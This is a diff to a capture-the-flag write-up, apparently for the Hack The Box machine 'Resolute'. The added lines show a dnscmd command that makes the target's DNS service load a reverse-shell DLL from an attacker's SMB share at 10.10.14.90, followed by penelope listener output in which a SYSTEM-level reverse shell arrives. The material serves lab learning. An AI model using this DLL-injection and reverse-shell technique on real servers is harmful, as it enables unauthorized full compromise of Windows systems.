@@ -307,7 +307,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 Ill start an SMB server
 
 ```python
-dnscmd.exe /config /serverlevelplugindll \\10.10.14.90\share\reverse.dll
+*Evil-WinRM* PS C:\Temp> dnscmd.exe /config /serverlevelplugindll \\10.10.14.90\share\reverse.dll
 
 Registry property serverlevelplugindll successfully reset.
 Command completed successfully.
@@ -335,6 +335,25 @@ SERVICE_NAME: dns
         PID                : 2780
         FLAGS              :
 *Evil-WinRM* PS C:\Temp> 
-
 ```
+Now after stopping and starting DNS i get a shell a few seconds later
+
+```python
+penelope -p 1337                                     
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => RESOLUTE 10.129.96.155 Microsoft_Windows_Server_2016_Standard-x64-based_PC 👤 nt authority\system 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/RESOLUTE~10.129.96.155-Microsoft_Windows_Server_2016_Standard-x64-based_PC/2026_04_15-20_05_50-195.log
+───────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+```
+I now have a shell!
+
+
 
